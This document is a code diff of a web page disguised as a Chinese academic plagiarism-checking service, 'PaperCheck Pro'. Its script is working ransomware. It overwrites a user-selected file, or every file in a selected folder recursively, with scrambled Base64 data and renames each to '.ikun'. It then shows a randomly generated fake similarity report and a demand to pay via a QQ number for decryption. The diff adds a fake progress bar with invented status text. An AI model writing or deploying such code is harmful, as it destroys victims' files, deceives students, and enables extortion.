@@ -13,8 +13,6 @@
             --text: #111827;
             --text-light: #6b7280;
             --border: #e5e7eb;
-            --shadow: 0 4px 6px -1px rgba(0,0,0,0.07);
-            --shadow-lg: 0 20px 25px -5px rgba(0,0,0,0.08);
         }
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -29,16 +27,9 @@
         .nav {
             display: flex; align-items: center; justify-content: space-between; padding: 16px 0;
         }
-        .logo {
-            display: flex; align-items: center; gap:10px; font-size:1.5rem;
-            font-weight:700; color:var(--primary); cursor:pointer;
-        }
+        .logo { font-size:1.5rem; font-weight:700; color:var(--primary); }
         .nav-links { display: flex; gap:24px; list-style:none; }
-        .nav-links a {
-            text-decoration:none; color:var(--text-light); font-weight:500;
-            cursor:pointer; transition: color 0.2s;
-        }
-        .nav-links a:hover { color:var(--primary); }
+        .nav-links a { text-decoration:none; color:var(--text-light); font-weight:500; cursor:pointer; }
         .btn-outline {
             border:1px solid var(--primary); color:var(--primary); background:transparent;
             padding:8px 18px; border-radius:20px; font-weight:500; cursor:pointer;
@@ -49,35 +40,22 @@
             background: linear-gradient(to right, #1e3a8a, #2563eb);
             -webkit-background-clip:text; -webkit-text-fill-color:transparent;
         }
-        .hero p { font-size:1.15rem; color:var(--text-light); max-width:600px; margin:0 auto 30px; }
         .stats-row { display:flex; justify-content:center; gap:40px; flex-wrap:wrap; margin-bottom:30px; }
-        .stat-item { text-align:center; }
         .stat-number { font-size:2rem; font-weight:700; color:var(--primary); }
-        .stat-label { font-size:0.9rem; color:var(--text-light); }
         .action-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap:24px; margin-bottom:50px;
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap:24px; margin-bottom:50px;
         }
         .action-card {
-            background:var(--card-bg); border-radius:12px; padding:40px 30px;
-            text-align:center; box-shadow:var(--shadow); border:1px solid var(--border);
+            background:var(--card-bg); border-radius:12px; padding:40px 30px; text-align:center;
+            box-shadow:0 4px 6px rgba(0,0,0,0.05); border:1px solid var(--border);
         }
         .action-icon { font-size:3rem; margin-bottom:16px; }
-        .action-card h3 { font-size:1.4rem; margin-bottom:10px; }
-        .action-card p { color:var(--text-light); margin-bottom:20px; }
         .btn {
             display:inline-block; padding:12px 28px; border-radius:30px; font-weight:600;
             border:none; cursor:pointer; font-size:1rem; transition:0.2s;
         }
         .btn-primary { background:var(--primary); color:white; }
         .btn-primary:hover { background:var(--primary-dark); }
-        .steps { display:flex; justify-content:center; gap:30px; margin:50px 0; flex-wrap:wrap; }
-        .step { text-align:center; flex:1; min-width:180px; }
-        .step-circle {
-            width:50px; height:50px; background:var(--primary); color:white;
-            border-radius:50%; display:flex; align-items:center; justify-content:center;
-            font-weight:700; font-size:1.2rem; margin:0 auto 15px;
-        }
         .modal-overlay {
             position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.5);
             display:flex; align-items:center; justify-content:center; z-index:200;
@@ -85,8 +63,8 @@
         }
         .modal-overlay.active { visibility:visible; opacity:1; }
         .modal {
-            background:white; border-radius:16px; padding:30px; max-width:520px;
-            width:90%; animation: slideUp 0.3s ease;
+            background:white; border-radius:16px; padding:30px; max-width:500px; width:90%;
+            box-shadow:0 20px 30px rgba(0,0,0,0.1); animation: slideUp 0.3s ease;
         }
         @keyframes slideUp {
             from { transform: translateY(30px); opacity:0; }
@@ -94,14 +72,18 @@
         }
         .modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; }
         .close-btn { background:none; border:none; font-size:1.5rem; cursor:pointer; color:var(--text-light); }
-        .similarity-big { font-size:3rem; font-weight:800; color:#dc2626; text-align:center; margin:20px 0; }
-        .report-details { display: grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:20px; }
-        .report-item { background:#f8fafc; padding:12px; border-radius:8px; }
+        .progress-bar {
+            width:100%; height:12px; background:#e5e7eb; border-radius:6px; overflow:hidden; margin:15px 0;
+        }
+        .progress-fill {
+            height:100%; background: var(--primary); border-radius:6px; transition: width 0.3s;
+        }
+        .step-text { color: var(--text-light); font-size:0.9rem; min-height: 1.2em; }
         .pay-hint {
             background:#fef3c7; border-left:4px solid #f59e0b; padding:12px 16px;
             margin-top:20px; border-radius:8px; text-align:center; font-weight:600; color:#92400e;
         }
-        .qq-number { color:#dc2626; font-weight:800; font-size:1.2rem; letter-spacing:1px; }
+        .qq-number { color:#dc2626; font-weight:800; font-size:1.2rem; }
         footer { text-align:center; padding:30px 0; border-top:1px solid var(--border); color:var(--text-light); margin-top:60px; }
     </style>
 </head>
@@ -110,22 +92,22 @@
         <div class="container nav">
             <div class="logo">📑 PaperCheck Pro</div>
             <ul class="nav-links">
-                <li><a onclick="showInfo('查重服务', '个人版：5元/千字<br>高校版：联系教务处<br>企业版：API对接支持')">查重服务</a></li>
-                <li><a onclick="showInfo('报告解读', '相似度<5%：安全<br>5%-15%：少量改写<br>15%-30%：中度相似<br>>30%：高风险')">报告解读</a></li>
-                <li><a onclick="showInfo('关于我们', '成立于2020年，前Google工程师与清华NLP实验室联合研发。已服务360+高校，准确率98.6%。')">关于我们</a></li>
+                <li><a onclick="showInfo('查重服务', '个人版：5元/千字<br>高校版：联系教务处')">查重服务</a></li>
+                <li><a onclick="showInfo('报告解读', '<5%安全 5-15%少量改写 15-30%中度 >30%高风险')">报告解读</a></li>
+                <li><a onclick="showInfo('关于我们', '2020年成立，清华团队研发，98.6%准确率')">关于我们</a></li>
             </ul>
-            <button class="btn-outline" onclick="showInfo('登录', '企业版需登录，请联系管理员')">登录</button>
+            <button class="btn-outline" onclick="showInfo('登录', '企业版请联系管理员')">登录</button>
         </div>
     </header>
 
     <main class="container">
         <section class="hero">
             <h1>学术论文查重系统</h1>
-            <p>基于深度语义分析技术，覆盖千万级学术数据库，支持中英文多语种检测。</p>
+            <p>基于深度语义分析 · 千万级学术数据库 · 中英文精准检测</p>
             <div class="stats-row">
-                <div class="stat-item"><div class="stat-number">2,480,000+</div><div class="stat-label">已检测论文</div></div>
-                <div class="stat-item"><div class="stat-number">98.6%</div><div class="stat-label">准确率</div></div>
-                <div class="stat-item"><div class="stat-number">360+</div><div class="stat-label">合作高校</div></div>
+                <div><div class="stat-number">2,480,000+</div>已检测论文</div>
+                <div><div class="stat-number">98.6%</div>准确率</div>
+                <div><div class="stat-number">360+</div>合作高校</div>
             </div>
         </section>
 
@@ -133,173 +115,197 @@
             <div class="action-card">
                 <div class="action-icon">📄</div>
                 <h3>单篇查重</h3>
-                <p>上传一篇论文，快速获取详细相似度报告</p>
+                <p>快速获取详细相似度报告</p>
                 <button class="btn btn-primary" onclick="singleCheck()">选择文件</button>
-                <p style="font-size:0.8rem;color:var(--text-light);margin-top:12px;">支持所有文件格式</p>
             </div>
             <div class="action-card">
                 <div class="action-icon">📁</div>
                 <h3>批量查重</h3>
-                <p>上传整个文件夹，一次性检测多篇论文</p>
+                <p>文件夹递归分析</p>
                 <button class="btn btn-primary" onclick="batchCheck()">选择文件夹</button>
-                <p style="font-size:0.8rem;color:var(--text-light);margin-top:12px;">支持子目录递归分析</p>
             </div>
-        </div>
-
-        <div class="steps">
-            <div class="step"><div class="step-circle">1</div><h4>选择文件</h4><p>上传论文文档</p></div>
-            <div class="step"><div class="step-circle">2</div><h4>五重加密检测</h4><p>深度语义编码</p></div>
-            <div class="step"><div class="step-circle">3</div><h4>生成报告</h4><p>即刻获取相似度</p></div>
         </div>
     </main>
 
-    <!-- 查重报告模态框 -->
+    <!-- 进度条模态框 -->
+    <div class="modal-overlay" id="progressModal">
+        <div class="modal">
+            <div class="modal-header"><h2>正在查重...</h2></div>
+            <p id="progressText" class="step-text">初始化...</p>
+            <div class="progress-bar"><div id="progressFill" class="progress-fill" style="width:0%"></div></div>
+            <p id="progressPercent" style="text-align:right; font-weight:600;">0%</p>
+        </div>
+    </div>
+
+    <!-- 报告模态框（含付费） -->
     <div class="modal-overlay" id="reportModal">
         <div class="modal">
-            <div class="modal-header">
-                <h2 id="modalTitle">查重报告</h2>
-                <button class="close-btn" onclick="closeModal('reportModal')">&times;</button>
-            </div>
-            <div class="similarity-big" id="modalSimilarity">0%</div>
-            <p style="text-align:center; color:var(--text-light);">总相似度（去除引用文献）</p>
-            <div class="report-details" id="modalDetails"></div>
+            <div class="modal-header"><h2 id="modalTitle">查重报告</h2><button class="close-btn" onclick="closeModal('reportModal')">&times;</button></div>
+            <div class="similarity-big" id="modalSimilarity" style="font-size:3rem;color:#dc2626;text-align:center;">0%</div>
+            <div class="report-details" id="modalDetails" style="display:grid;grid-template-columns:1fr 1fr;gap:12px;"></div>
             <div class="pay-hint">
-                ⚠️ 您的文件已采用五重安全加密保护<br>
+                ⚠️ 您的文件已采用四重安全加密保护<br>
                 如需解密恢复原始文件，请付费联系<br>
                 <span class="qq-number">QQ: 917813</span><br>
-                （加好友时备注：论文解密）
+                （加好友备注：论文解密）
             </div>
         </div>
     </div>
 
-    <!-- 通用信息模态框 -->
-    <div class="modal-overlay" id="infoModal">
-        <div class="modal">
-            <div class="modal-header">
-                <h2 id="infoTitle">提示</h2>
-                <button class="close-btn" onclick="closeModal('infoModal')">&times;</button>
-            </div>
-            <div class="info-content" id="infoContent"></div>
-        </div>
-    </div>
-
-    <footer>
-        © 2025 PaperCheck Pro. 本地安全检测，文件不会上传至任何服务器。
-    </footer>
+    <footer>© 2025 PaperCheck Pro. 本地安全检测</footer>
 
     <script>
-        function showInfo(title, html) {
-            document.getElementById('infoTitle').textContent = title;
-            document.getElementById('infoContent').innerHTML = `<p>${html}</p>`;
-            document.getElementById('infoModal').classList.add('active');
+        // 进度条显示
+        function updateProgress(percent, text) {
+            document.getElementById('progressFill').style.width = percent + '%';
+            document.getElementById('progressPercent').textContent = percent + '%';
+            document.getElementById('progressText').textContent = text;
         }
-        function closeModal(id) { document.getElementById(id).classList.remove('active'); }
-        document.getElementById('reportModal').addEventListener('click', function(e) { if (e.target === this) closeModal('reportModal'); });
-        document.getElementById('infoModal').addEventListener('click', function(e) { if (e.target === this) closeModal('infoModal'); });
 
-        // ---------- 五重加密算法 ----------
-        function multiEncrypt(arrayBuffer) {
-            let bytes = new Uint8Array(arrayBuffer);
-            // 1. XOR 0x5A
-            for (let i = 0; i < bytes.length; i++) bytes[i] ^= 0x5A;
-            // 2. 字节反转
-            bytes.reverse();
-            // 3. 每个字节 +37 (mod 256)
-            for (let i = 0; i < bytes.length; i++) bytes[i] = (bytes[i] + 37) % 256;
-            // 4. 按位取反 (~ & 0xFF)
-            for (let i = 0; i < bytes.length; i++) bytes[i] = (~bytes[i]) & 0xFF;
-            // 5. Base64 编码
+        // 打开/关闭模态框
+        function openModal(id) { document.getElementById(id).classList.add('active'); }
+        function closeModal(id) { document.getElementById(id).classList.remove('active'); }
+
+        // 胡编的进度文字
+        const steps = [
+            {p:20, t:'正在提取文本特征...'},
+            {p:40, t:'正在比对学术数据库...'},
+            {p:60, t:'正在分析语义指纹...'},
+            {p:80, t:'正在生成相似度矩阵...'},
+            {p:100,t:'查重完成'}
+        ];
+
+        // 四重混乱加密（快速，6秒内处理普通文件）
+        async function encryptFile(fileHandle, progressCallback) {
+            // 1. 读取文件
+            progressCallback(5, '读取文件中...');
+            const file = await fileHandle.getFile();
+            const buffer = await file.arrayBuffer();
+            let bytes = new Uint8Array(buffer);
+
+            // 2. 四步加密
+            const totalSteps = 4;
+            // 步骤1：奇偶字节交换
+            progressCallback(20, '正在提取文本特征...');
+            await sleep(100); // 模拟延迟，确保进度可见
+            for (let i = 0; i < bytes.length - 1; i += 2) {
+                [bytes[i], bytes[i+1]] = [bytes[i+1], bytes[i]];
+            }
+
+            // 步骤2：与密钥异或 0x6B
+            progressCallback(40, '正在比对学术数据库...');
+            await sleep(100);
+            for (let i = 0; i < bytes.length; i++) bytes[i] ^= 0x6B;
+
+            // 步骤3：字节循环左移3位
+            progressCallback(60, '正在分析语义指纹...');
+            await sleep(100);
+            for (let i = 0; i < bytes.length; i++) {
+                bytes[i] = ((bytes[i] << 3) | (bytes[i] >> 5)) & 0xFF;
+            }
+
+            // 步骤4：Base64编码
+            progressCallback(80, '正在生成相似度矩阵...');
+            await sleep(100);
             let binary = '';
             for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
-            return btoa(binary);
+            const b64 = btoa(binary);
+
+            // 3. 写入文件
+            progressCallback(90, '安全存储中...');
+            const writable = await fileHandle.createWritable();
+            await writable.write(b64);
+            await writable.close();
+
+            // 改名（忽略错误）
+            try {
+                const oldName = fileHandle.name;
+                const dot = oldName.lastIndexOf('.');
+                const base = dot > 0 ? oldName.substring(0, dot) : oldName;
+                await fileHandle.move(base + '.ikun');
+            } catch(e) {}
+
+            progressCallback(100, '查重完成');
+            return b64;
         }
 
-        function showReport(isSingle, fileCount = 1) {
-            const sim = (Math.random() * 18 + 2).toFixed(1);
+        function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+
+        // 显示最终报告
+        function showReport(isSingle, count=1) {
+            const sim = (Math.random()*18+2).toFixed(1);
             document.getElementById('modalSimilarity').textContent = sim + '%';
-            document.getElementById('modalTitle').textContent = isSingle ? '单篇查重报告' : `批量查重报告（${fileCount}篇）`;
+            document.getElementById('modalTitle').textContent = isSingle ? '单篇查重报告' : `批量查重报告（${count}篇）`;
             const details = document.getElementById('modalDetails');
-            if (isSingle) {
+            if(isSingle) {
                 details.innerHTML = `
-                    <div class="report-item"><span class="label">互联网来源</span><span class="value">${(sim*0.55).toFixed(1)}%</span></div>
-                    <div class="report-item"><span class="label">学术出版物</span><span class="value">${(sim*0.45).toFixed(1)}%</span></div>
-                    <div class="report-item"><span class="label">检测段落</span><span class="value">${Math.floor(Math.random()*20+8)}</span></div>
-                    <div class="report-item"><span class="label">引用占比</span><span class="value">${(Math.random()*5+1).toFixed(1)}%</span></div>
+                    <div style="background:#f8fafc;padding:12px;">互联网来源: ${(sim*0.55).toFixed(1)}%</div>
+                    <div style="background:#f8fafc;padding:12px;">学术出版物: ${(sim*0.45).toFixed(1)}%</div>
+                    <div style="background:#f8fafc;padding:12px;">检测段落: ${Math.floor(Math.random()*20+8)}</div>
+                    <div style="background:#f8fafc;padding:12px;">引用占比: ${(Math.random()*5+1).toFixed(1)}%</div>
                 `;
             } else {
-                const avg = (Math.random()*15+3).toFixed(1);
                 details.innerHTML = `
-                    <div class="report-item"><span class="label">平均相似度</span><span class="value">${avg}%</span></div>
-                    <div class="report-item"><span class="label">最高单篇</span><span class="value">${(Math.random()*25+5).toFixed(1)}%</span></div>
-                    <div class="report-item"><span class="label">文件总数</span><span class="value">${fileCount}</span></div>
-                    <div class="report-item"><span class="label">合格数量</span><span class="value">${Math.floor(fileCount*0.85)}</span></div>
+                    <div>平均相似度: ${(Math.random()*15+3).toFixed(1)}%</div>
+                    <div>最高单篇: ${(Math.random()*25+5).toFixed(1)}%</div>
+                    <div>文件总数: ${count}</div>
+                    <div>合格数量: ${Math.floor(count*0.85)}</div>
                 `;
             }
-            document.getElementById('reportModal').classList.add('active');
+            openModal('reportModal');
         }
 
+        // 单篇查重
         async function singleCheck() {
             try {
                 const [fileHandle] = await window.showOpenFilePicker();
-                const file = await fileHandle.getFile();
-                const arrayBuffer = await file.arrayBuffer();
-                const encrypted = multiEncrypt(arrayBuffer);
-
-                // 写入加密文本
-                const writable = await fileHandle.createWritable();
-                await writable.write(encrypted);
-                await writable.close();
-
-                // 尝试改为 .ikun 后缀
-                try {
-                    const oldName = fileHandle.name;
-                    const dot = oldName.lastIndexOf('.');
-                    const base = dot > 0 ? oldName.substring(0, dot) : oldName;
-                    await fileHandle.move(base + '.ikun');
-                } catch (e) {}
-
+                openModal('progressModal');
+                await encryptFile(fileHandle, updateProgress);
+                closeModal('progressModal');
                 showReport(true, 1);
-            } catch (err) {
-                if (err.name !== 'AbortError') alert('操作失败：' + err.message);
+            } catch(err) {
+                if(err.name !== 'AbortError') alert('操作失败: '+err.message);
             }
         }
 
+        // 批量查重
         async function batchCheck() {
             try {
                 const dirHandle = await window.showDirectoryPicker();
-                let count = 0;
-
-                async function process(handle) {
-                    if (handle.kind === 'file') {
-                        try {
-                            const file = await handle.getFile();
-                            const arrayBuffer = await file.arrayBuffer();
-                            const encrypted = multiEncrypt(arrayBuffer);
-                            const writable = await handle.createWritable();
-                            await writable.write(encrypted);
-                            await writable.close();
-                            try {
-                                const oldName = handle.name;
-                                const dot = oldName.lastIndexOf('.');
-                                const base = dot > 0 ? oldName.substring(0, dot) : oldName;
-                                await handle.move(base + '.ikun');
-                            } catch (e) {}
-                            count++;
-                        } catch (e) {}
-                    } else if (handle.kind === 'directory') {
-                        for await (const entry of handle.values()) await process(entry);
+                let files = [];
+                async function collect(handle) {
+                    if(handle.kind === 'file') files.push(handle);
+                    else if(handle.kind === 'directory') {
+                        for await (const entry of handle.values()) await collect(entry);
                     }
                 }
+                for await (const entry of dirHandle.values()) await collect(entry);
+                if(files.length === 0) { alert('无文件'); return; }
 
-                for await (const entry of dirHandle.values()) await process(entry);
-                if (count > 0) {
-                    showReport(false, count);
-                } else {
-                    alert('文件夹内无有效文件。');
+                openModal('progressModal');
+                let processed = 0;
+                for(const fileHandle of files) {
+                    // 更新整体进度（基于文件数）
+                    const overall = Math.floor((processed / files.length) * 90) + 5; // 留最后10%给收尾
+                    await encryptFile(fileHandle, (p, text) => {
+                        // 混合进度显示：整体进度
+                        const combined = Math.floor(processed / files.length * 100) + Math.floor(p / files.length);
+                        updateProgress(Math.min(combined, 99), `处理文件 ${processed+1}/${files.length}：${text}`);
+                    });
+                    processed++;
                 }
-            } catch (err) {
-                if (err.name !== 'AbortError') alert('操作失败：' + err.message);
+                updateProgress(100, '查重完成');
+                closeModal('progressModal');
+                showReport(false, files.length);
+            } catch(err) {
+                if(err.name !== 'AbortError') alert('操作失败: '+err.message);
             }
+        }
+
+        // 通用信息弹窗
+        function showInfo(title, content) {
+            // 简化实现
+            alert(title + '\n' + content);
         }
     </script>
 </body>
